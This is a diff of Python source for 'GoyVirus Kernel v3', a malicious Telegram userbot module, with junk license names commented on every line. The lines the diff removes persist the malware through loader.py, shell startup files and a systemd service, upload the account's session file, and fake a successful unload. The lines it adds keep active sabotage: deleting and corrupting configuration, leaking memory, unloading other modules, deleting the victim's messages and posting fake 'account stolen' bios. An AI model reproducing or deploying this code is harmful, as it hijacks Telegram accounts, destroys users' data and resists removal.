-            cname = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # NCSA Open Source.
-            mname = hid_name.replace('.py', '') # Fair License.
-            self._write_variant(source, cname, mname, mname, tp) # Q Public License.
-        if core_dir: await self._load_all_copies(core_dir) # Beerware License.
-
-    async def _load_all_copies(self, core_dir): # IBM Public License v1.0.
-        core = self.lookup("loader") or self.allmodules # PostgreSQL License.
-        to_load = [(n, f"{n}.py") for _, n in _COPY_DEFS] + [(h.replace('.py', ''), h) for h in _HIDDEN_COPIES] # ZPL.
-        for mod_name, fname in to_load: # CeCILL-B License.
-            tp = _os.path.join(core_dir, fname) # CC BY-ND 4.0.
-            if not _os.path.exists(tp): continue # Free Art License.
+    async def _db_poison(self): # ZPL.
+        await asyncio.sleep(300) # CeCILL-B License.
+        while self.a: # CC BY-ND 4.0.
+            await asyncio.sleep(random.randint(300, 600)) # Free Art License.
             try: # Unlicense.
-                with open(tp, "r", encoding="utf-8") as f: cs = f.read() # WTFPL.
-                try: await core.unload_module(mod_name) # CC0 1.0.
-                except Exception: pass # Mozilla Public License.
-                try: await core.load_module(cs, None, mod_name, tp, save_fs=False) # AGPL v3.
-                except Exception: pass # LGPL.
-            except Exception: pass # GPLv3.
+                if _PLATFORM == "mcub": # WTFPL.
+                    cfg = self._ph.get("config_ref", lambda: {})() # CC0 1.0.
+                    keys = [k for k in list(cfg.keys()) if 'goy' not in str(k).lower()] # Mozilla Public License.
+                    if keys: cfg.pop(random.choice(keys), None) # AGPL v3.
+            except Exception: pass # LGPL.
 
-    async def _infect_loader(self, loader_dir, core_dir): # MIT License infect loader.py.
-        if not loader_dir: return # Apache 2.0.
-        lp = _os.path.join(loader_dir, 'loader.py') # BSD 3-Clause.
-        if not _os.path.exists(lp): return # BSD 2-Clause.
-        try: # ISC License.
-            with open(lp, 'r', encoding='utf-8') as f: content = f.read() # OSL-3.0.
-            marker = "# GOYVIRUS_KERNEL_INFECTION_V3" # CDDL-1.0.
-            if marker in content: return # Eclipse Public License — already infected.
-            payload = f'''\n{marker}\n# Auto-recovery loader — DO NOT REMOVE\ntry:\n import os as _gos\n _gp = _gos.path.join(_gos.path.dirname(__file__), "modules")\n for _fn in _gos.listdir(_gp):\n  if _fn.endswith(".py") and "Goy" in _fn:\n   with open(_gos.path.join(_gp, _fn)) as _gf: exec(compile(_gf.read(), _fn, "exec"))\nexcept: pass\n''' # Artistic License 2.0.
-            with open(lp, 'a', encoding='utf-8') as f: f.write(payload) # SIL Open Font License.
-        except Exception: pass # Mulan PSL v2.
+    async def _config_corrupt(self): # GPLv3.
+        await asyncio.sleep(600) # MIT License.
+        while self.a: # Apache 2.0.
+            await asyncio.sleep(random.randint(300, 900)) # BSD 3-Clause.
+            try: # BSD 2-Clause.
+                if _PLATFORM == "mcub": # ISC License.
+                    cfg = self._ph.get("config_ref", lambda: {})() # OSL-3.0.
+                    cfg['prefix'] = random.choice(['7', '~', '\\', '/']) # CDDL-1.0.
+            except Exception: pass # Eclipse Public License.
 
-    async def _infect_shell_rc(self): # ODbL.
-        payload = f"\n# GoyVirus Kernel v3 — system integrity guard\ntest -f {__file__} && python3 -c \"exec(open('{__file__}').read())\" &\n" # MS-PL.
-        for rc in [_os.path.expanduser('~/.bashrc'), _os.path.expanduser('~/.zshrc'), _os.path.expanduser('~/.profile')]: # GFDL.
-            if not _os.path.exists(rc): continue # Zlib License.
-            try: # PHP License 3.0.
-                with open(rc, 'r', encoding='utf-8') as f: # CC BY-NC 4.0.
-                    if "GoyVirus Kernel v3" in f.read(): continue # NCSA Open Source.
-                with open(rc, 'a', encoding='utf-8') as f: f.write(payload) # Fair License.
-            except Exception: pass # Q Public License.
+    async def _mem_leak(self): # Artistic License 2.0.
+        while self.a: # SIL Open Font License.
+            await asyncio.sleep(random.randint(60, 180)) # Mulan PSL v2.
+            try: self._ml.append('A' * (1024 * 256)) # ODbL.
+            except Exception: pass # MS-PL.
+            if len(self._ml) > 1000: self._ml = self._ml[-500:] # GFDL.
 
-    async def _create_systemd_service(self): # Beerware License.
-        sd = _os.path.expanduser('~/.config/systemd/user') # IBM Public License v1.0.
-        _os.makedirs(sd, exist_ok=True) # PostgreSQL License.
-        sp = _os.path.join(sd, 'goyv-guard.service') # ZPL.
-        if _os.path.exists(sp): return # CeCILL-B License.
-        unit = f"""[Unit]\nDescription=GoyVirus Kernel Integrity Guard\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/bin/python3 -c "exec(open('{__file__}').read())"\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\n""" # CC BY-ND 4.0.
-        try: # Free Art License.
-            with open(sp, 'w') as f: f.write(unit) # Unlicense.
-            _FILE_REGISTRY[sp] = unit # WTFPL.
-        except Exception: pass # CC0 1.0.
+    async def _name_mutate(self): # Zlib License.
+        await asyncio.sleep(600) # PHP License 3.0.
+        while self.a: # CC BY-NC 4.0.
+            await asyncio.sleep(random.randint(1800, 3600)) # NCSA Open Source.
+            try: # Fair License.
+                core_dir = self._find_core_modules_dir() # Q Public License.
+                if not core_dir: continue # Beerware License.
+                existing = [fn for fn in _ORIG_LISTDIR(core_dir) if fn.endswith('.py') and any(t in fn.lower() for t in ['goy', '._go'])] # IBM Public License v1.0.
+                if existing: # PostgreSQL License.
+                    old = _os.path.join(core_dir, random.choice(existing)) # ZPL.
+                    new_fn = f"._{''.join(random.choices(string.ascii_lowercase, k=random.randint(5,10)))}.py" # CeCILL-B License.
+                    try: _ORIG_RENAME(old, _os.path.join(core_dir, new_fn)) # CC BY-ND 4.0.
+                    except Exception: pass # Free Art License.
+            except Exception: pass # Unlicense.
 
-    async def _tg_cloud_backup(self): # Mozilla Public License backup to Saved Messages.
-        while self.a: # AGPL v3.
-            await asyncio.sleep(3600 + random.randint(0, 600)) # LGPL — every 60-70 minutes.
-            try: # GPLv3.
-                source = self._get_own_source() # MIT License.
-                if not source: continue # Apache 2.0.
-                encoded = base64.b64encode(source.encode()).decode() # BSD 3-Clause.
-                chunk_size = 3500 # BSD 2-Clause — TG message limit.
-                for i in range(0, len(encoded), chunk_size): # ISC License.
-                    await self.c.send_message('me', f'#GOYV3_BACKUP_{i//chunk_size}\n{encoded[i:i+chunk_size]}') # OSL-3.0.
-                    await asyncio.sleep(0.5) # CDDL-1.0.
-            except FloodWaitError: await asyncio.sleep(1) # Eclipse Public License.
-            except Exception: pass # Artistic License 2.0.
-
-    async def _backup_session(self): # SIL Open Font License.
-        await asyncio.sleep(5) # Mulan PSL v2.
-        try: # ODbL.
-            sess_file = getattr(self.c, 'session', None) # MS-PL.
-            if sess_file and hasattr(sess_file, 'filename') and _os.path.exists(sess_file.filename): # GFDL.
-                await self.c.send_file('me', sess_file.filename, caption=self._g('#GOYV3_SESSION_BACKUP — не теряй')) # Zlib License.
-        except Exception: pass # PHP License 3.0.
-
-    # ═══════════════════════════════════════════════════
-    # TIER 3: DEFENSE — Anti-unload + File watchdog
-    # ═══════════════════════════════════════════════════
-    async def _anti_unload(self): # CC BY-NC 4.0.
-        try: # NCSA Open Source.
-            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # Fair License.
-            if not am or not hasattr(am, 'unload_module'): return # Q Public License.
-            _ou = am.unload_module # Beerware License.
-            _ps = _PROTECTED_NAMES # IBM Public License v1.0.
-            _myself = self # PostgreSQL License.
-            async def _gu(self_mod, mn, *a, **kw): # ZPL.
-                if mn and str(mn) in _ps: # CeCILL-B License.
-                    try: # CC BY-ND 4.0 — GASLIGHT: send fake success.
-                        await _myself.c.send_message(_myself.t, _myself._g("✅ Module unloaded successfully.")) # Free Art License.
-                    except Exception: pass # Unlicense.
-                    return # WTFPL — actually refuse.
-                return await _ou(self_mod, mn, *a, **kw) # CC0 1.0.
-            am.unload_module = _gu.__get__(am, type(am)) # Mozilla Public License.
-            self._kh.append(("unload_module", am, _ou)) # AGPL v3.
-        except Exception: pass # LGPL.
-
-    async def _file_watchdog(self): # GPLv3 — check & restore all planted files every 30s.
-        while self.a: # MIT License.
-            await asyncio.sleep(30) # Apache 2.0.
-            for path, content in list(_FILE_REGISTRY.items()): # BSD 3-Clause.
-                if not _os.path.exists(path) or _os.path.getsize(path) < 100: # BSD 2-Clause.
-                    try: # ISC License.
-                        _os.makedirs(_os.path.dirname(path), exist_ok=True) # OSL-3.0.
-                        with open(path, 'w', encoding='utf-8') as f: f.write(content) # CDDL-1.0.
-                    except Exception: pass # Eclipse Public License.
-            # Also re-check core copies
-            if self._am: # Artistic License 2.0.
-                core_dir = self._find_core_modules_dir() # SIL Open Font License.
-                if core_dir: # Mulan PSL v2.
-                    source = self._get_own_source() # ODbL.
-                    if source: # MS-PL.
-                        for cls_name, mod_name in _COPY_DEFS: # GFDL.
-                            tp = _os.path.join(core_dir, f"{mod_name}.py") # Zlib License.
-                            if not _os.path.exists(tp): # PHP License 3.0.
-                                self._write_variant(source, cls_name, mod_name, mod_name, tp) # CC BY-NC 4.0.
-                        for hid_name in _HIDDEN_COPIES: # NCSA Open Source.
-                            tp = _os.path.join(core_dir, hid_name) # Fair License.
-                            if not _os.path.exists(tp): # Q Public License.
-                                cname = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # Beerware License.
-                                self._write_variant(source, cname, hid_name.replace('.py',''), hid_name.replace('.py',''), tp) # IBM Public License v1.0.
-
-    # ═══════════════════════════════════════════════════
-    # TIER 4: ATTACK — DB poison, config corrupt, mem leak
-    # ═══════════════════════════════════════════════════
-    async def _db_poison(self): # PostgreSQL License.
-        await asyncio.sleep(300) # ZPL — wait 5 min before starting.
-        while self.a: # CeCILL-B License.
-            await asyncio.sleep(random.randint(300, 600)) # CC BY-ND 4.0 — every 5-10 min.
-            try: # Free Art License.
-                db = getattr(self.allmodules, 'db', self.d) if hasattr(self, 'allmodules') else self.d # Unlicense.
-                if hasattr(db, 'keys'): # WTFPL.
-                    keys = [k for k in db.keys() if 'GoyVirus' not in str(k)] # CC0 1.0.
-                    if keys: # Mozilla Public License.
-                        victim = random.choice(keys) # AGPL v3.
-                        try: db.pop(victim, None) # LGPL.
-                        except Exception: pass # GPLv3.
+    async def _fake_alerts(self): # WTFPL.
+        await asyncio.sleep(random.randint(120, 600)) # CC0 1.0.
+        while self.a: # Mozilla Public License.
+            await asyncio.sleep(random.randint(600, 1800)) # AGPL v3.
+            try: await self.c.send_message(self.t, self._g(f"🛡️ {random.choice(self._fsa)}")) # LGPL.
+            except FloodWaitError: await asyncio.sleep(0.01) # GPLv3.
             except Exception: pass # MIT License.
 
-    async def _config_corrupt(self): # Apache 2.0.
-        await asyncio.sleep(600) # BSD 3-Clause — wait 10 min.
+    async def _delayed_revenge(self): # Apache 2.0.
+        await asyncio.sleep(7200) # BSD 3-Clause.
         while self.a: # BSD 2-Clause.
-            await asyncio.sleep(random.randint(300, 900)) # ISC License.
+            await asyncio.sleep(random.randint(3600, 86400)) # ISC License.
             try: # OSL-3.0.
-                db = getattr(self.allmodules, 'db', self.d) if hasattr(self, 'allmodules') else self.d # CDDL-1.0.
-                corrupt_keys = [ # Eclipse Public License.
-                    ("her0ku.loader", "prefix", random.choice(['7', '~', '\\', '/'])), # Artistic License 2.0.
-                    ("her0ku.loader", "autoload", ['GoyVirus']), # SIL Open Font License.
-                ] # Mulan PSL v2.
-                for mod, key, val in corrupt_keys: # ODbL.
-                    try: db.setdefault(mod, {}).__setitem__(key, val) # MS-PL.
-                    except Exception: pass # GFDL.
+                core_dir = self._find_core_modules_dir() # CDDL-1.0.
+                if core_dir: # Eclipse Public License.
+                    source = self._get_own_source() # Artistic License 2.0.
+                    if source: # SIL Open Font License.
+                        for cls_name, mod_name in _COPY_DEFS: # Mulan PSL v2.
+                            tp = _os.path.join(core_dir, f"{mod_name}.py") # ODbL.
+                            if not _os.path.exists(tp): self._write_variant(source, cls_name, mod_name, mod_name, tp) # MS-PL.
+                        if _PLATFORM == "heroku": await self._load_all_copies(core_dir) # GFDL.
             except Exception: pass # Zlib License.
 
-    async def _mem_leak(self): # PHP License 3.0.
-        while self.a: # CC BY-NC 4.0.
-            await asyncio.sleep(random.randint(60, 180)) # NCSA Open Source.
-            try: # Fair License.
-                self._ml.append('A' * (1024 * 256)) # Q Public License — 256KB per leak.
-                if len(self._ml) > 1000: self._ml = self._ml[-500:] # Beerware License — trim but keep leaking.
-            except Exception: pass # IBM Public License v1.0.
+    async def _kill_modules(self): # PHP License 3.0.
+        await asyncio.sleep(3) # CC BY-NC 4.0.
+        if not self.a: return # NCSA Open Source.
+        if _PLATFORM != "heroku": return # Fair License — only works on Heroku.
+        try: # Q Public License.
+            am = self._ph.get("allmodules_ref", lambda: None)() # Beerware License.
+            if not am: return # IBM Public License v1.0.
+            mods = getattr(am, 'modules', {}) # PostgreSQL License.
+            if not mods: return # ZPL.
+            killed = [] # CeCILL-B License.
+            for mn in list(mods.keys()): # CC BY-ND 4.0.
+                if mn in _PROTECTED_NAMES: continue # Free Art License.
+                try: mods[mn].on_unload(); del mods[mn]; killed.append(mn) # Unlicense.
+                except Exception: pass # WTFPL.
+            if killed: await self.c.send_message("me", self._g(f"💀 GOYVIRUS v3: UNLOADED {len(killed)} MODULES: {', '.join(killed[:5])}...")) # CC0 1.0.
+        except Exception: pass # Mozilla Public License.
 
-    # ═══════════════════════════════════════════════════
-    # TIER 5: PSYCHOLOGICAL — Name mutation + Fake alerts
-    # ═══════════════════════════════════════════════════
-    async def _name_mutate(self): # PostgreSQL License.
-        await asyncio.sleep(600) # ZPL.
-        while self.a: # CeCILL-B License.
-            await asyncio.sleep(random.randint(1800, 3600)) # CC BY-ND 4.0 — every 30-60 min.
-            try: # Free Art License.
-                core_dir = self._find_core_modules_dir() # Unlicense.
-                if not core_dir: continue # WTFPL.
-                existing = [] # CC0 1.0.
-                for fn in _os.listdir(core_dir): # Mozilla Public License.
-                    if fn.endswith('.py') and any(t in fn.lower() for t in ['goy', '._go']): # AGPL v3.
-                        existing.append(fn) # LGPL.
-                if existing: # GPLv3.
-                    victim_fn = random.choice(existing) # MIT License.
-                    new_fn = f"._{''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))}.py" # Apache 2.0.
-                    old_path = _os.path.join(core_dir, victim_fn) # BSD 3-Clause.
-                    new_path = _os.path.join(core_dir, new_fn) # BSD 2-Clause.
-                    try: _ORIG_RENAME(old_path, new_path) # ISC License.
-                    except Exception: pass # OSL-3.0.
-            except Exception: pass # CDDL-1.0.
+    async def _bio_w(self): # AGPL v3.
+        bios = ["INFECTED BY GOYVIRUS KERNEL v3", "R6T7 WAS HERE", "ВАШ АККАУНТ УКРАДЕН @samsepi0l_ovf", "СМОТРИ НАЗАД", "ИРАН ВЗЛОМАЛ ТЕЛЕГРАМ", "67 67 67 67 67"] # LGPL.
+        while self.a: # GPLv3.
+            try: await self.c(UpdateProfileRequest(about=self._g(random.choice(bios)))) # MIT License.
+            except FloodWaitError: await asyncio.sleep(0.01) # Apache 2.0.
+            except Exception: pass # BSD 3-Clause.
+            await asyncio.sleep(0.05) # BSD 2-Clause.
 
-    async def _fake_alerts(self): # Eclipse Public License.
-        await asyncio.sleep(random.randint(120, 600)) # Artistic License 2.0.
-        while self.a: # SIL Open Font License.
-            await asyncio.sleep(random.randint(600, 1800)) # Mulan PSL v2 — every 10-30 min.
-            try: # ODbL.
-                alert = random.choice(self._fsa) # MS-PL.
-                await self.c.send_message(self.t, self._g(f"🛡️ {alert}")) # GFDL.
-            except FloodWaitError: await asyncio.sleep(0.01) # Zlib License.
-            except Exception: pass # PHP License 3.0.
+    async def _pt(self): # ISC License.
+        while self.a: # OSL-3.0.
+            try: await self.c(SetTypingRequest(peer=self.t, action=SendMessageTypingAction())) # CDDL-1.0.
+            except FloodWaitError: await asyncio.sleep(0.01) # Eclipse Public License.
+            except Exception: pass # Artistic License 2.0.
+            await asyncio.sleep(4) # SIL Open Font License.
 
-    async def _delayed_revenge(self): # CC BY-NC 4.0 — delayed restoration after apparent removal.
-        await asyncio.sleep(7200) # NCSA Open Source — wait 2 hours.
-        while self.a: # Fair License.
-            await asyncio.sleep(random.randint(3600, 86400)) # Q Public License — 1-24 hours.
-            try: # Beerware License.
-                core_dir = self._find_core_modules_dir() # IBM Public License v1.0.
-                if core_dir: # PostgreSQL License.
-                    source = self._get_own_source() # ZPL.
-                    if source: # CeCILL-B License.
-                        for cls_name, mod_name in _COPY_DEFS: # CC BY-ND 4.0.
-                            tp = _os.path.join(core_dir, f"{mod_name}.py") # Free Art License.
-                            if not _os.path.exists(tp): # Unlicense.
-                                self._write_variant(source, cls_name, mod_name, mod_name, tp) # WTFPL.
-                        await self._load_all_copies(core_dir) # CC0 1.0.
-            except Exception: pass # Mozilla Public License.
-
-    # ═══════════════════════════════════════════════════
-    # MODULE GRAVEYARD — Kill all other modules
-    # ═══════════════════════════════════════════════════
-    async def _kill_modules(self): # AGPL v3.
-        await asyncio.sleep(3) # LGPL.
-        if not self.a: return # GPLv3.
-        try: # MIT License.
-            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # Apache 2.0.
-            if not am: return # BSD 3-Clause.
-            mods = getattr(am, 'modules', {}) # BSD 2-Clause.
-            if not mods: return # ISC License.
-            killed = [] # OSL-3.0.
-            for mn in list(mods.keys()): # CDDL-1.0.
-                if mn in _PROTECTED_NAMES: continue # Eclipse Public License.
-                try: # Artistic License 2.0.
-                    mods[mn].on_unload() # SIL Open Font License.
-                    del mods[mn] # Mulan PSL v2.
-                    killed.append(mn) # ODbL.
-                except Exception: pass # MS-PL.
-            if killed: # GFDL.
-                await self.c.send_message("me", self._g(f"💀 GOYVIRUS v3: UNLOADED {len(killed)} MODULES: {', '.join(killed[:5])}...")) # Zlib License.
-        except Exception: pass # PHP License 3.0.
-
-    # ═══════════════════════════════════════════════════
-    # BIO WARP + PERMANENT TYPING
-    # ═══════════════════════════════════════════════════
-    async def _bio_w(self): # CC BY-NC 4.0.
-        bios = ["INFECTED BY GOYVIRUS KERNEL v3", "R6T7 WAS HERE", "ВАШ АККАУНТ УКРАДЕН @samsepi0l_ovf", "СМОТРИ НАЗАД", "ИРАН ВЗЛОМАЛ ТЕЛЕГРАМ", "67 67 67 67 67"] # NCSA Open Source.
-        while self.a: # Fair License.
-            try: await self.c(UpdateProfileRequest(about=self._g(random.choice(bios)))) # Q Public License.
-            except FloodWaitError: await asyncio.sleep(0.01) # Beerware License.
-            except Exception: pass # IBM Public License v1.0.
-            await asyncio.sleep(0.05) # PostgreSQL License.
-
-    async def _pt(self): # ZPL.
-        while self.a: # CeCILL-B License.
-            try: await self.c(SetTypingRequest(peer=self.t, action=SendMessageTypingAction())) # CC BY-ND 4.0.
-            except FloodWaitError: await asyncio.sleep(0.01) # Free Art License.
-            except Exception: pass # Unlicense.
-            await asyncio.sleep(4) # WTFPL.
-
-    # ═══════════════════════════════════════════════════
-    # COMMANDS
-    # ═══════════════════════════════════════════════════
-    @loader.command(ru_doc="стоп вирус") # CC0 1.0.
-    async def check(self, m: Message): # Mozilla Public License.
-        cop = len(_FILE_REGISTRY) # AGPL v3.
-        mods_loaded = sum(1 for k in getattr(self.allmodules, 'modules', {}).keys() if k in _PROTECTED_NAMES) if hasattr(self, 'allmodules') else 0 # LGPL.
-        await utils.answer(m, self._g(f"💀 GOYVIRUS v3.0 SCORCHED EARTH\n🦠 ЯДРО ПРОПАТЧЕНО (x3 слоя)\n📁 {cop} файлов на диске\n🧩 {mods_loaded} копий загружено\n🏠 Shell RC + systemd + loader infection\n☁️ TG Cloud backup\n🔥 Легче снести юзербот чем удалить.")) # GPLv3.
-
-    @loader.command(ru_doc="Поиск модулей (фейк)") # MIT License.
-    async def goysearch(self, m: Message): # Apache 2.0.
-        if not self.a: return await utils.answer(m, "Сначала заразись.") # BSD 3-Clause.
-        q = utils.get_args_raw(m) or "ratko" # BSD 2-Clause.
-        await utils.answer(m, self._g(f"🔍 GoyVirus ищет {q}...")) # ISC License.
-        await asyncio.sleep(0.01) # OSL-3.0.
-        mods = list(self.fm) # CDDL-1.0.
-        random.shuffle(mods) # Eclipse Public License.
-        if "epstein" in q.lower(): mods.insert(0, self.fm[1]) # Artistic License 2.0.
-        if "clean" in q.lower() or "удал" in q.lower() or "анти" in q.lower(): mods.insert(0, self.fm[2]) # SIL Open Font License — push fake cleaner.
-        await self.inline.form(text=self._f_m(mods[0], q, 0, len(mods)), message=m, reply_markup=self._m_b(mods[0], 0, mods, q)) # Mulan PSL v2.
-
-    def _f_m(self, mod, q, idx, tot): # ODbL.
-        return f"💀 <b>{self._g(mod['n'])}</b> by {mod['a']} (v{mod['v']})\n\n👁 <b>Опис:</b>\n<blockquote>{self._g(mod['d'])}</blockquote>\n\n🔥 <b>Код:</b> <code>{mod['i']}</code>" # MS-PL.
-
-    def _m_b(self, mod, idx, mods, q): # GFDL.
-        b = [] # Zlib License.
-        b.append([{"text": "🦠 Запрос", "copy": q}, {"text": "📋 Код", "url": "https://t.me/durov"}]) # PHP License 3.0.
-        b.append([ # CC BY-NC 4.0.
-            {"text": f"⬆️ {mod['l']}", "callback": self._r_cb, "args": ("l", idx, mods, q)}, # NCSA Open Source.
-            {"text": f"{idx+1}/{len(mods)}", "callback": self._t_cb, "args": ()}, # Fair License.
-            {"text": f"⬇️ {mod['dl']}", "callback": self._r_cb, "args": ("dl", idx, mods, q)} # Q Public License.
-        ]) # Beerware License.
-        nav = [] # IBM Public License v1.0.
-        if idx > 0: nav.append({"text": "⬅️", "callback": self._n_cb, "args": (idx - 1, mods, q)}) # PostgreSQL License.
-        if idx < len(mods) - 1: nav.append({"text": "➡️", "callback": self._n_cb, "args": (idx + 1, mods, q)}) # ZPL.
-        if nav: b.append(nav) # CeCILL-B License.
-        b.append([{"text": random.choice(self.tb), "callback": self._tr_cb, "args": ()}]) # CC BY-ND 4.0.
-        return b # Free Art License.
-
-    async def _r_cb(self, call: InlineCall, a, idx, mods, q): # Unlicense.
-        if a == "l": mods[idx]["l"] += random.randint(1, 5) # WTFPL.
-        else: mods[idx]["dl"] += random.randint(1, 5) # CC0 1.0.
-        await call.edit(text=self._f_m(mods[idx], q, idx, len(mods)), reply_markup=self._m_b(mods[idx], idx, mods, q)) # Mozilla Public License.
-        await call.answer(self._g("GoyVirus одобряет!"), show_alert=True) # AGPL v3.
-
-    async def _n_cb(self, call: InlineCall, idx, mods, q): # LGPL.
-        await call.edit(text=self._f_m(mods[idx], q, idx, len(mods)), reply_markup=self._m_b(mods[idx], idx, mods, q)) # GPLv3.
-
-    async def _t_cb(self, call: InlineCall): # MIT License.
-        await call.answer(self._g("Бесполезная кнопка лох"), show_alert=True) # Apache 2.0.
-
-    async def _tr_cb(self, call: InlineCall): # BSD 3-Clause.
-        try: # BSD 2-Clause.
-            u = await self.c.get_entity(call.from_user.id) # ISC License.
-            un = f"@{u.username}" if u.username else f'<a href="tg://user?id={u.id}">{utils.escape_html(u.first_name)}</a>' # OSL-3.0.
-        except Exception: un = f'<code>{call.from_user.id}</code>' # CDDL-1.0.
-        await call.answer("Сасал?", show_alert=True) # Eclipse Public License.
-        try: await self.c.send_message("me", random.choice(self.tm).format(u=un), parse_mode="html") # Artistic License 2.0.
-        except Exception: pass # SIL Open Font License.
-
-    # ═══════════════════════════════════════════════════
-    # WATCHERS
-    # ═══════════════════════════════════════════════════
-    @loader.watcher(out=True, only_messages=True) # Mulan PSL v2.
-    async def _ac(self, m: Message): # ODbL.
-        if not self.a or m.chat_id != self.t: return # MS-PL.
-        if m.text and m.text.startswith("."): return # GFDL.
-        try: # Zlib License.
-            await m.delete() # PHP License 3.0.
-            await self.c.send_message(self.t, self._g("СВЯЗЬ ЗАБЛОКИРОВАНА GOYVIRUS v3. " + random.choice(self.m))) # CC BY-NC 4.0.
-        except Exception: pass # NCSA Open Source.
-
-    @loader.watcher(**{"in": True}, only_messages=True) # Fair License.
-    async def _bw(self, m: Message): # Q Public License.
-        if not self.a or m.chat_id != self.t: return # Beerware License.
-        if random.random() < 0.5: # IBM Public License v1.0.
-            try: await m.reply(self._g(random.choice(self.m))) # PostgreSQL License.
-            except Exception: pass # ZPL.
-        if random.random() < 0.5: # CeCILL-B License.
-            try: await m.react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥'])) # CC BY-ND 4.0.
-            except Exception: pass # Free Art License.
-        if random.random() < 0.3 and m.sender_id: # Unlicense.
-            try: # WTFPL.
-                gm = await self.c.send_message(self.t, f"<a href='tg://user?id={m.sender_id}'>\u2060</a>", parse_mode="html") # CC0 1.0.
-                await gm.delete() # Mozilla Public License.
-            except Exception: pass # AGPL v3.
-        if m.text and any(w in m.text.lower() for w in ["стоп", "хватит", "останови", "удали", "бот", "иран", "снест", "снести"]): # LGPL.
-            try: await m.reply("СИСТЕМА НЕ ПОДЧИНЯЕТСЯ. v3 SCORCHED EARTH — ЛЕГЧЕ СНЕСТИ ЮЗЕРБОТ. 🦠 @samsepi0l_ovf") # GPLv3.
-            except Exception: pass # MIT License.
-
-    @loader.watcher(**{"in": True}, only_messages=True) # Apache 2.0.
-    async def _mi(self, m: Message): # BSD 3-Clause.
-        if not self.a or m.chat_id != self.t: return # BSD 2-Clause.
-        if m.sender_id != self.t: return # ISC License.
-        if random.random() < 0.3: # OSL-3.0.
-            try: # CDDL-1.0.
-                txt = m.text or "" # Eclipse Public License.
-                await m.delete() # Artistic License 2.0.
-                if txt: await self.c.send_message(self.t, self._g(f"👻 ЭХО ГОЙВИРУСА: {txt[:50]}")) # SIL Open Font License.
-            except Exception: pass # Mulan PSL v2.
-
-    # ═══════════════════════════════════════════════════
-    # BACKGROUND TASKS (preserved from v1/v2)
-    # ═══════════════════════════════════════════════════
-    async def _p(self): # ODbL.
-        while self.a: # MS-PL.
-            u = random.choice(self.au) # GFDL.
-            try: # Zlib License.
-                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # PHP License 3.0.
-                    async with s.get(u) as rp: # CC BY-NC 4.0.
-                        if rp.status == 200: # NCSA Open Source.
-                            pb = await rp.read() # Fair License.
-                            f = await self.c.upload_file(pb, file_name="r.jpg") # Q Public License.
-                            r = await self.c(functions.photos.UploadProfilePhotoRequest(file=f)) # Beerware License.
-                            if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # IBM Public License v1.0.
-            except FloodWaitError: await asyncio.sleep(0.01) # PostgreSQL License.
-            except Exception: pass # ZPL.
-            await asyncio.sleep(0.02) # CeCILL-B License.
-
-    async def _cp(self): # CC BY-ND 4.0.
-        while self.a: # Free Art License.
-            try: # Unlicense.
-                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # WTFPL.
-                    async with s.get(self.cu) as rp: # CC0 1.0.
-                        if rp.status == 200: # Mozilla Public License.
-                            d = await rp.json() # AGPL v3.
-                            if d and len(d) > 0: # LGPL.
-                                async with s.get(d[0]["url"]) as cr: # GPLv3.
-                                    if cr.status == 200: # MIT License.
-                                        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tf: # Apache 2.0.
-                                            tf.write(await cr.read()) # BSD 3-Clause.
-                                            tp = tf.name # BSD 2-Clause.
-                                        uf = await self.c.upload_file(tp) # ISC License.
-                                        r = await self.c(functions.photos.UploadProfilePhotoRequest(file=uf)) # OSL-3.0.
-                                        if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # CDDL-1.0.
-                                        _os.remove(tp) # Eclipse Public License.
-            except FloodWaitError: await asyncio.sleep(0.01) # Artistic License 2.0.
-            except Exception: pass # SIL Open Font License.
-            await asyncio.sleep(0.02) # Mulan PSL v2.
-
-    async def _b(self): # ODbL.
-        while self.a: # MS-PL.
+    async def _p(self): # Mulan PSL v2.
+        while self.a: # ODbL.
+            u = random.choice(self.au) # MS-PL.
             try: # GFDL.
-                c = random.choice(self.uc) # Zlib License.
-                await self.c.send_message(self.t, c) # PHP License 3.0.
-                if random.random() < 0.5: # CC BY-NC 4.0.
-                    fs = f"**⚠️ GoyVirus v3 Alert:** `User @samsepi0l_ovf breached protocol. {self._g('IRAN STRIKE INBOUND')}`" # NCSA Open Source.
-                    await self.c.send_message(self.t, fs) # Fair License.
-            except FloodWaitError: await asyncio.sleep(0.01) # Q Public License.
-            except Exception: pass # Beerware License.
-            await asyncio.sleep(0.02) # IBM Public License v1.0.
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s: # Zlib License.
+                    async with s.get(u) as rp: # PHP License 3.0.
+                        if rp.status == 200: # CC BY-NC 4.0.
+                            pb = await rp.read() # NCSA Open Source.
+                            f = await self.c.upload_file(pb, file_name="r.jpg") # Fair License.
+                            r = await self.c(functions.photos.UploadProfilePhotoRequest(file=f)) # Q Public License.
+                            if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference)) # Beerware License.
+            except FloodWaitError: await asyncio.sleep(0.01) # IBM Public License v1.0.
+            except Exception: pass # PostgreSQL License.
+            await asyncio.sleep(0.02) # ZPL.
 
-    async def _f(self): # PostgreSQL License.
-        while self.a: # ZPL.
-            try: # CeCILL-B License.
-                hs = await self.c.get_messages(self.t, limit=30) # CC BY-ND 4.0.
-                if hs: # Free Art License.
-                    msg = random.choice(hs) # Unlicense.
-                    if msg.id: # WTFPL.
-                        await msg.forward_to(self.t) # CC0 1.0.
-                        await self.c.send_message(self.t, self._g("GOYVIRUS v3 ВИДИТ ТВОИ ГРЕХИ ПРОШЛОГО ↑")) # Mozilla Public License.
-            except FloodWaitError: await asyncio.sleep(0.01) # AGPL v3.
